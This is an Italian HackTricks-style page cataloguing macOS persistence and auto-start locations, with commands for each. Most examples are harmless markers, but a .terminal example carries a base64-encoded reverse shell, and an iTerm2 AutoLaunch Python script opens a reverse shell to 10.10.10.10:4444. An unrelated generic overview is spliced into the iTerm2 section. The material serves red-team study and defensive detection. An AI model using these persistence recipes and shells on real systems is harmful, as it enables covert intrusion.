# Auto Start di macOS

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

Questa sezione si basa pesantemente sulla serie di blog [**Oltre i buoni vecchi LaunchAgents**](https://theevilbit.github.io/beyond/), l'obiettivo è aggiungere **ulteriori posizioni di avvio automatico** (se possibile), indicare **quali tecniche funzionano ancora** oggi con l'ultima versione di macOS (13.4) e specificare le **autorizzazioni** necessarie.

## Bypass di Sandbox

{% hint style="success" %}
Qui puoi trovare posizioni di avvio utili per il **bypass di sandbox** che ti permette di eseguire semplicemente qualcosa **scrivendolo in un file** e **aspettando** un'azione molto **comune**, una determinata **quantità di tempo** o un'**azione che di solito puoi eseguire** da dentro una sandbox senza bisogno di permessi di root.
{% endhint %}

### Launchd

* Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizioni

* **`/Library/LaunchAgents`**
* **Trigger**: Riavvio
* Richiede privilegi di root
* **`/Library/LaunchDaemons`**
* **Trigger**: Riavvio
* Richiede privilegi di root
* **`/System/Library/LaunchAgents`**
* **Trigger**: Riavvio
* Richiede privilegi di root
* **`/System/Library/LaunchDaemons`**
* **Trigger**: Riavvio
* Richiede privilegi di root
* **`~/Library/LaunchAgents`**
* **Trigger**: Relog-in
* **`~/Library/LaunchDemons`**
* **Trigger**: Relog-in

#### Descrizione ed Esploito

**`launchd`** è il **primo** **processo** eseguito dal kernel di OX S all'avvio e l'ultimo a terminare allo spegnimento. Dovrebbe sempre avere il **PID 1**. Questo processo **leggerà ed eseguirà** le configurazioni indicate nei **plist ASEP** in:

* `/Library/LaunchAgents`: Agenti per utente installati dall'amministratore
* `/Library/LaunchDaemons`: Daemon per tutto il sistema installati dall'amministratore
* `/System/Library/LaunchAgents`: Agenti per utente forniti da Apple.
* `/System/Library/LaunchDaemons`: Daemon per tutto il sistema forniti da Apple.

Quando un utente effettua il login, i plist situati in `/Users/$USER/Library/LaunchAgents` e `/Users/$USER/Library/LaunchDemons` vengono avviati con le **autorizzazioni degli utenti connessi**.

**La differenza principale tra agenti e daemon è che gli agenti vengono caricati quando l'utente effettua il login e i daemon vengono caricati all'avvio del sistema** (poiché ci sono servizi come ssh che devono essere eseguiti prima che qualsiasi utente acceda al sistema). Inoltre, gli agenti possono utilizzare l'interfaccia grafica mentre i daemon devono essere eseguiti in background.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
Ci sono casi in cui un **agente deve essere eseguito prima che l'utente effettui l'accesso**, questi vengono chiamati **PreLoginAgents**. Ad esempio, questo è utile per fornire tecnologia assistiva durante l'accesso. Possono essere trovati anche in `/Library/LaunchAgents` (vedi [**qui**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) un esempio).

{% hint style="info" %}
I nuovi file di configurazione di Daemons o Agents verranno **caricati dopo il riavvio successivo o utilizzando** `launchctl load <target.plist>`. È **anche possibile caricare file .plist senza quella estensione** con `launchctl -F <file>` (tuttavia quei file plist non verranno caricati automaticamente dopo il riavvio).\
È anche possibile **scaricare** con `launchctl unload <target.plist>` (il processo a cui punta verrà terminato).

Per **assicurarsi** che non ci sia **nulla** (come un override) **che impedisca** a un **Agente** o **Daemon** **di essere eseguito**, eseguire: `sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

Elencare tutti gli agenti e i demoni caricati dall'utente corrente:
```bash
launchctl list
```
{% hint style="warning" %}
Se un plist è di proprietà di un utente, anche se si trova in una cartella di sistema daemon, il **task verrà eseguito come utente** e non come root. Ciò può prevenire alcuni attacchi di escalation dei privilegi.
{% endhint %}

### File di avvio della shell

Writeup: [https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
Writeup (xterm): [https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
* Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
* Ma è necessario trovare un'app con un bypass TCC che esegue una shell che carica questi file

#### Posizioni

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv.zwc`**, **`~/.zshenv`, `~/.zprofile`**
* **Trigger**: Aprire un terminale con zsh
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **Trigger**: Aprire un terminale con zsh
* Richiede privilegi di root
* **`~/.zlogout`**
* **Trigger**: Uscire da un terminale con zsh
* **`/etc/zlogout`**
* **Trigger**: Uscire da un terminale con zsh
* Richiede privilegi di root
* Potenzialmente altri in: **`man zsh`**
* **`~/.bashrc`**
* **Trigger**: Aprire un terminale con bash
* `/etc/profile` (non ha funzionato)
* `~/.profile` (non ha funzionato)
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **Trigger**: Si prevede che venga attivato con xterm, ma **non è installato** e anche dopo l'installazione viene generato questo errore: xterm: `DISPLAY non è impostato`

#### Descrizione e sfruttamento

Quando si avvia un ambiente shell come `zsh` o `bash`, **vengono eseguiti determinati file di avvio**. Attualmente macOS utilizza `/bin/zsh` come shell predefinita. Questa shell viene automaticamente accessa quando viene avviata l'applicazione Terminal o quando si accede a un dispositivo tramite SSH. Mentre `bash` e `sh` sono anche presenti in macOS, devono essere esplicitamente invocati per essere utilizzati.

La pagina man di zsh, che possiamo leggere con **`man zsh`**, ha una lunga descrizione dei file di avvio.
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### Applicazioni riaperte

{% hint style="danger" %}
La configurazione dell'exploit indicato e il logout e il login o addirittura il riavvio non hanno funzionato per me per eseguire l'applicazione. (L'applicazione non veniva eseguita, forse è necessario che sia in esecuzione quando vengono eseguite queste azioni)
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* Utile per aggirare la sandbox: [✅](https://emojipedia.org/check-mark-button)
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **Trigger**: Riavvio delle applicazioni riaperte

#### Descrizione ed exploit

Tutte le applicazioni da riaprire sono all'interno del plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`

Quindi, per far sì che le applicazioni riaperte avviino la tua, è sufficiente **aggiungere la tua app alla lista**.

L'UUID può essere trovato elencando quella directory o con `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Per verificare le applicazioni che verranno riaperte, puoi eseguire:
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
Per **aggiungere un'applicazione a questa lista** puoi utilizzare:
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### Preferenze del Terminale

* Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
* Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
* Il Terminale utilizza le autorizzazioni FDA dell'utente che lo utilizza

#### Posizione

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **Trigger**: Apri il Terminale

#### Descrizione ed Esploito

Nella cartella **`~/Library/Preferences`** vengono memorizzate le preferenze dell'utente nelle applicazioni. Alcune di queste preferenze possono contenere una configurazione per **eseguire altre applicazioni/script**.

Ad esempio, il Terminale può eseguire un comando all'avvio:

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

Questa configurazione viene riflessa nel file **`~/Library/Preferences/com.apple.Terminal.plist`** come segue:
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
Quindi, se il plist delle preferenze del terminale nel sistema può essere sovrascritto, la funzionalità **`open`** può essere utilizzata per **aprire il terminale e eseguire quel comando**.

Puoi aggiungerlo dalla cli con:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### Script Terminali / Altre estensioni di file

* Utile per aggirare il sandbox: [✅](https://emojipedia.org/check-mark-button)
* Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
* Il terminale utilizza le autorizzazioni FDA dell'utente che lo utilizza

#### Posizione

* **Ovunque**
* **Trigger**: Apri il Terminale

#### Descrizione ed Esploito

Se crei uno script [**`.terminal`**](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx) e lo apri, l'applicazione **Terminale** verrà automaticamente invocata per eseguire i comandi indicati al suo interno. Se l'applicazione Terminale ha alcuni privilegi speciali (come TCC), il tuo comando verrà eseguito con quei privilegi speciali.

Provalo con:
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
È possibile utilizzare anche le estensioni **`.command`** e **`.tool`**, con contenuto di script shell regolare, e verranno aperte anche da Terminal.

{% hint style="danger" %}
Se il terminale ha **Accesso completo al disco**, sarà in grado di completare quell'azione (nota che il comando eseguito sarà visibile in una finestra del terminale).
{% endhint %}

### Plugin audio

Articolo: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Articolo: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

* Utile per aggirare il sandbox: [✅](https://emojipedia.org/check-mark-button)
* Bypass TCC: [🟠](https://emojipedia.org/large-orange-circle)
* Potresti ottenere alcuni accessi TCC extra

#### Posizione

* **`/Library/Audio/Plug-Ins/HAL`**
* Richiede privilegi di root
* **Trigger**: Riavvia coreaudiod o il computer
* **`/Library/Audio/Plug-ins/Components`**
* Richiede privilegi di root
* **Trigger**: Riavvia coreaudiod o il computer
* **`~/Library/Audio/Plug-ins/Components`**
* **Trigger**: Riavvia coreaudiod o il computer
* **`/System/Library/Components`**
* Richiede privilegi di root
* **Trigger**: Riavvia coreaudiod o il computer

#### Descrizione

Secondo gli articoli precedenti, è possibile **compilare alcuni plugin audio** e caricarli.

### Plugin QuickLook

Articolo: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* Utile per aggirare il sandbox: [✅](https://emojipedia.org/check-mark-button)
* Bypass TCC: [🟠](https://emojipedia.org/large-orange-circle)
* Potresti ottenere alcuni accessi TCC extra

#### Posizione

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/NomeAppQui/Contents/Library/QuickLook/`
* `~/Applications/NomeAppQui/Contents/Library/QuickLook/`

#### Descrizione ed Esploito

I plugin QuickLook possono essere eseguiti quando **si attiva l'anteprima di un file** (premere la barra spaziatrice con il file selezionato in Finder) ed è installato un **plugin che supporta quel tipo di file**.

È possibile compilare il proprio plugin QuickLook, posizionarlo in una delle posizioni precedenti per caricarlo e quindi andare su un file supportato e premere spazio per attivarlo.

### ~~Hook di accesso/uscita~~

{% hint style="danger" %}
Questo non ha funzionato per me, né con l'Hook di accesso utente né con l'Hook di uscita di root.
{% endhint %}

**Articolo**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

* Utile per aggirare il sandbox: [✅](https://emojipedia.org/check-mark-button)
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

* È necessario essere in grado di eseguire qualcosa come `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh`
* Si trova in `~/Library/Preferences/com.apple.loginwindow.plist`

Sono deprecati ma possono essere utilizzati per eseguire comandi quando un utente effettua l'accesso.
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
Questa impostazione è memorizzata in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist`
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
Per eliminarlo:
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
Il file dell'utente root è memorizzato in **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## Bypass condizionale del sandbox

{% hint style="success" %}
Qui puoi trovare le posizioni di avvio utili per il **bypass del sandbox** che ti consente di eseguire semplicemente qualcosa **scrivendolo in un file** e **aspettando condizioni non super comuni** come specifici **programmi installati, azioni o ambienti "non comuni"**.
{% endhint %}

### Cron

**Descrizione**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
* Tuttavia, è necessario essere in grado di eseguire il binario `crontab`
* O essere root
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* Richiede privilegi di root per l'accesso diretto in scrittura. Non richiede privilegi di root se è possibile eseguire `crontab <file>`
* **Trigger**: Dipende dal lavoro cron

#### Descrizione ed esecuzione

Elenca i lavori cron dell'**utente corrente** con:
```bash
crontab -l
```
Puoi anche vedere tutti i lavori cron degli utenti in **`/usr/lib/cron/tabs/`** e **`/var/at/tabs/`** (richiede privilegi di root).

In MacOS è possibile trovare diverse cartelle che eseguono script con **una certa frequenza** in:
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
Qui puoi trovare i **cron job** regolari, i **job at** (non molto utilizzati) e i **job periodici** (principalmente utilizzati per la pulizia dei file temporanei). I job periodici giornalieri possono essere eseguiti ad esempio con: `periodic daily`.

Per aggiungere un **user cronjob in modo programmatico** è possibile utilizzare:
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
* Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
* iTerm2 utilizza i permessi TCC concessi

#### Posizioni

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **Trigger**: Apri iTerm
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **Trigger**: Apri iTerm
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **Trigger**: Apri iTerm

#### Descrizione ed Esploito

Gli script memorizzati in **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** verranno eseguiti. Ad esempio:
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
# Posizioni di avvio automatico di macOS

In macOS, ci sono diverse posizioni in cui è possibile configurare le applicazioni per avviarsi automaticamente all'avvio del sistema. Queste posizioni possono essere sfruttate da un attaccante per eseguire codice dannoso o per ottenere privilegi elevati.

Di seguito sono elencate le posizioni di avvio automatico più comuni in macOS:

## 1. LaunchAgents

Le LaunchAgents sono file di tipo .plist che specificano quali applicazioni o script devono essere avviati automaticamente all'avvio dell'utente. Questi file sono solitamente posizionati nella directory `~/Library/LaunchAgents` o `/Library/LaunchAgents`.

Per visualizzare i LaunchAgents attualmente configurati, è possibile utilizzare il comando:

```bash
ls -la ~/Library/LaunchAgents
ls -la /Library/LaunchAgents
```

## 2. LaunchDaemons

I LaunchDaemons sono simili alle LaunchAgents, ma vengono eseguiti con privilegi di root. Questi file sono posizionati nella directory `/Library/LaunchDaemons` o `/System/Library/LaunchDaemons`.

Per visualizzare i LaunchDaemons attualmente configurati, è possibile utilizzare il comando:

```bash
ls -la /Library/LaunchDaemons
ls -la /System/Library/LaunchDaemons
```

## 3. Login Items

I Login Items sono applicazioni o script che vengono avviati automaticamente all'accesso dell'utente. Queste impostazioni possono essere trovate nelle preferenze di sistema di macOS.

Per visualizzare i Login Items attualmente configurati, è possibile seguire questi passaggi:

1. Fare clic sull'icona Apple nella barra dei menu.
2. Selezionare "Preferenze di Sistema".
3. Fare clic su "Utenti e gruppi".
4. Selezionare l'account utente desiderato.
5. Fare clic sulla scheda "Accesso".
6. Verificare le applicazioni o gli script elencati.

## 4. Cron Jobs

I Cron Jobs sono script o comandi che vengono eseguiti automaticamente in base a un programma di pianificazione. Questi possono essere configurati utilizzando il comando `crontab`.

Per visualizzare i Cron Jobs attualmente configurati, è possibile utilizzare il comando:

```bash
crontab -l
```

## 5. Startup Items

I Startup Items sono applicazioni o script che vengono avviati automaticamente all'avvio del sistema. Tuttavia, questa funzionalità è stata deprecata a partire da macOS 10.4 e non è più supportata.

Per verificare se ci sono ancora Startup Items configurati, è possibile utilizzare il comando:

```bash
ls -la /Library/StartupItems
```

## 6. Launchctl

Launchctl è un comando di macOS utilizzato per gestire i servizi di avvio automatico. Può essere utilizzato per caricare, scaricare o elencare i servizi di avvio automatico.

Per visualizzare tutti i servizi di avvio automatico configurati, è possibile utilizzare il comando:

```bash
launchctl list
```

## 7. Applicazioni di terze parti

Alcune applicazioni di terze parti possono avere le proprie impostazioni di avvio automatico. Queste impostazioni possono essere trovate all'interno delle preferenze dell'applicazione stessa.

## Conclusioni

È importante essere consapevoli delle posizioni di avvio automatico di macOS e delle applicazioni configurate per avviarsi automaticamente. Monitorare e verificare regolarmente queste impostazioni può aiutare a prevenire l'esecuzione di codice dannoso o l'accesso non autorizzato al sistema.
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.py" << EOF
#!/usr/bin/env python3
import iterm2,socket,subprocess,os

async def main(connection):
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.10.10',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['zsh','-i']);
async with iterm2.CustomControlSequenceMonitor(
connection, "shared-secret", r'^create-window$') as mon:
while True:
match = await mon.async_get()
await iterm2.Window.async_create(connection)

iterm2.run_forever(main)
EOF
```
Lo script **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** verrà eseguito anche:
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
Le preferenze di iTerm2 si trovano in **`~/Library/Preferences/com.googlecode.iterm2.plist`** e possono **indicare un comando da eseguire** quando viene aperto il terminale di iTerm2.

Questa impostazione può essere configurata nelle impostazioni di iTerm2:

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt="" width="563"><figcaption></figcaption></figure>

E il comando viene riflessato nelle preferenze:
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
Puoi impostare il comando da eseguire con:

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
È molto probabile che ci siano **altre modalità per sfruttare le preferenze di iTerm2** per eseguire comandi arbitrari.
{% endhint %}

### xbar

Descrizione: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* Utile per aggirare il sandbox: [✅](https://emojipedia.org/check-mark-button)
* Ma xbar deve essere installato
* Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
* Richiede le autorizzazioni di Accessibilità

#### Posizione

* **`~/Library/Application\ Support/xbar/plugins/`**
* **Trigger**: Una volta che xbar viene eseguito

#### Descrizione

Se il popolare programma [**xbar**](https://github.com/matryer/xbar) è installato, è possibile scrivere uno script shell in **`~/Library/Application\ Support/xbar/plugins/`** che verrà eseguito quando xbar viene avviato:
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

* Utile per bypassare la sandbox: [✅](https://emojipedia.org/check-mark-button)
* Ma Hammerspoon deve essere installato
* Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
* Richiede le autorizzazioni di accessibilità

#### Posizione

* **`~/.hammerspoon/init.lua`**
* **Trigger**: Una volta che Hammerspoon viene eseguito

#### Descrizione

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) funge da piattaforma di automazione per **macOS**, sfruttando il linguaggio di scripting **LUA** per le sue operazioni. In particolare, supporta l'integrazione di codice AppleScript completo e l'esecuzione di script shell, migliorando significativamente le sue capacità di scripting.

L'app cerca un singolo file, `~/.hammerspoon/init.lua`, e quando viene avviata, lo script verrà eseguito.
```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```
### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* Utile per bypassare il sandbox: [✅](https://emojipedia.org/check-mark-button)
* Ma ssh deve essere abilitato e utilizzato
* Bypass TCC: [✅](https://emojipedia.org/check-mark-button)
* SSH utilizzato per avere accesso FDA

#### Posizione

* **`~/.ssh/rc`**
* **Trigger**: Accesso tramite ssh
* **`/etc/ssh/sshrc`**
* Richiede privilegi di root
* **Trigger**: Accesso tramite ssh

{% hint style="danger" %}
Per abilitare ssh è necessario avere l'accesso completo al disco:
```bash
sudo systemsetup -setremotelogin on
```
{% endhint %}

#### Descrizione ed Esploito

Per impostazione predefinita, a meno che `PermitUserRC no` non sia presente in `/etc/ssh/sshd_config`, quando un utente effettua il login tramite SSH, gli script **`/etc/ssh/sshrc`** e **`~/.ssh/rc`** verranno eseguiti.

### **Elementi di accesso**

Articolo: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* Utile per aggirare il sandbox: [✅](https://emojipedia.org/check-mark-button)
* Ma è necessario eseguire `osascript` con gli argomenti
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizioni

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **Trigger:** Accesso
* Payload di exploit memorizzato chiamando **`osascript`**
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **Trigger:** Accesso
* Richiede privilegi di root

#### Descrizione

Nelle Preferenze di Sistema -> Utenti e Gruppi -> **Elementi di accesso** è possibile trovare **elementi da eseguire quando l'utente effettua il login**.\
È possibile elencarli, aggiungerli e rimuoverli dalla riga di comando:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Questi elementi sono memorizzati nel file **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**

Gli **elementi di accesso** possono essere indicati anche utilizzando l'API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) che memorizzerà la configurazione in **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**

### ZIP come elemento di accesso

(Verifica la sezione precedente sugli elementi di accesso, questa è un'estensione)

Se si memorizza un file **ZIP** come **elemento di accesso**, l'**`Archive Utility`** lo aprirà e se il file zip fosse ad esempio memorizzato in **`~/Library`** e contenesse la cartella **`LaunchAgents/file.plist`** con un backdoor, quella cartella verrà creata (non lo è di default) e il plist verrà aggiunto in modo che la prossima volta che l'utente effettua nuovamente l'accesso, il **backdoor indicato nel plist verrà eseguito**.

Un'altra opzione sarebbe quella di creare i file **`.bash_profile`** e **`.zshenv`** all'interno della HOME dell'utente, in modo che se la cartella LaunchAgents esiste già, questa tecnica funzionerà comunque.

### At

Articolo: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* Utile per aggirare il sandbox: [✅](https://emojipedia.org/check-mark-button)
* Ma è necessario **eseguire** **`at`** e deve essere **abilitato**
* Bypass TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Posizione

* È necessario **eseguire** **`at`** e deve essere **abilitato**

#### **Descrizione**

I task `at` sono progettati per **programmare attività one-time** da eseguire in determinati momenti. A differenza dei lavori cron, i task `at` vengono automaticamente rimossi dopo l'esecuzione. È importante notare che questi task sono persistenti anche dopo il riavvio del sistema, il che li rende potenziali preoccupazioni per la sicurezza in determinate condizioni.

Di **default** sono **disabilitati**, ma l'utente **root** può **abilitarli** con:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Questo creerà un file in 1 ora:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
Controlla la coda dei lavori utilizzando `atq:`
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Sopra possiamo vedere due lavori pianificati. Possiamo stampare i dettagli del lavoro utilizzando `at -c NUMERO_DI_LAVORO`
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
